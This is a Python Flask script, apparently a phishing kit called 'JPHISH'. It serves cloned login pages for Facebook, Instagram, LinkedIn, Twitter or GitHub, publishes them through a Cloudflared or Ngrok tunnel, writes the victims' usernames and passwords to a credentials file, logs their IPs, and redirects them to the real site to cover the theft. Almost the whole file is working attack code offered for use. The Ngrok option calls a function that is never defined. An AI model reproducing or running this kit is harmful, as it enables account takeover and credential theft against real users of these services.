import os
import subprocess
import time
import sys
import shutil
from datetime import datetime
from flask import Flask, request, render_template, redirect

app = Flask(__name__, template_folder="templates")

# ASCII Banner
def show_banner():
    print("""
     ██╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
     ██║██╔══██╗██║  ██║██║██╔════╝██║  ██║
     ██║██████╔╝███████║██║███████╗███████║
██   ██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║
╚█████╔╝██║     ██║  ██║██║███████║██║  ██║
 ╚════╝ ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
    """)

# Log credentials and sessions
def log_credentials(username, password, service):
    with open('credentials.txt', 'a') as f:
        f.write(f"[{datetime.now()}] Service: {service}, Username: {username}, Password: {password}\n")

def log_session(ip, service):
    with open('sessions.log', 'a') as f:
        f.write(f"[{datetime.now()}] IP: {ip}, Visited: {service}\n")

# Detect Termux
def is_termux():
    return "com.termux" in os.environ.get("PREFIX", "")

# Install Cloudflared
def install_cloudflared():
    try:
        if is_termux():
            subprocess.run(["pkg", "install", "-y", "cloudflared"], check=True)
        else:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
            subprocess.run(["wget", url, "-O", "cloudflared"], check=True)
            subprocess.run(["chmod", "+x", "cloudflared"], check=True)
            subprocess.run(["sudo", "mv", "cloudflared", "/usr/local/bin/"], check=True)
        return True
    except Exception as e:
        print(f"[!] Failed to install Cloudflared: {e}")
        return False

# Start Cloudflared tunnel
def start_cloudflared(port=8080, custom_domain=None):
    tool_path = shutil.which("cloudflared") or "/usr/local/bin/cloudflared"
    if not tool_path:
        if input("Install Cloudflared? (y/n): ").lower() == "y":
            if not install_cloudflared():
                return None
            tool_path = shutil.which("cloudflared") or "/usr/local/bin/cloudflared"
        else:
            return None

    cmd = [tool_path, "tunnel", "--url", f"http://localhost:{port}"]
    if custom_domain:
        cmd.extend(["--hostname", custom_domain])

    try:
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        time.sleep(5)
        for line in process.stderr:
            if "trycloudflare.com" in line or (custom_domain and custom_domain in line):
                public_url = line.split("|")[-1].strip()
                print(f"[+] Public URL: {public_url}")
                return public_url
        return None
    except Exception as e:
        print(f"[!] Cloudflared error: {e}")
        return None

# Main setup
def setup():
    show_banner()
    print("\n[+] Select Phishing Page:")
    print("1. Facebook")
    print("2. Instagram")
    print("3. LinkedIn")
    print("4. Twitter")
    print("5. GitHub")
    choice = input("\nEnter choice (1-5): ").strip()

    print("\n[+] Select Tunnel:")
    print("1. Cloudflared (Recommended)")
    print("2. Ngrok")
    tunnel_choice = input("Enter choice (1/2): ").strip()

    # Start tunnel
    public_url = None
    if tunnel_choice == "1":
        custom_domain = input("Custom domain (leave blank for default): ").strip() or None
        public_url = start_cloudflared(custom_domain=custom_domain)
    elif tunnel_choice == "2":
        ngrok_token = input("Ngrok Auth Token: ").strip()
        public_url = start_ngrok(ngrok_token)
    else:
        print("[!] Invalid choice.")
        sys.exit(1)

    if not public_url:
        sys.exit(1)

    # Configure Flask routes
    services = {
        "1": {"template": "facebook.html", "redirect": "https://facebook.com"},
        "2": {"template": "instagram.html", "redirect": "https://instagram.com"},
        "3": {"template": "linkedin.html", "redirect": "https://linkedin.com"},
        "4": {"template": "twitter.html", "redirect": "https://twitter.com"},
        "5": {"template": "github.html", "redirect": "https://github.com"}
    }

    @app.route('/')
    def home():
        return render_template(services[choice]["template"])

    @app.route('/login', methods=['POST'])
    def login():
        username = request.form.get('email') or request.form.get('username')
        password = request.form.get('pass') or request.form.get('password')
        log_credentials(username, password, services[choice]["template"].replace('.html', ''))
        return redirect(services[choice]["redirect"], code=302)

    print(f"\n[+] Phishing page active: {public_url}")
    app.run(host='0.0.0.0', port=8080)

if __name__ == '__main__':
    setup()
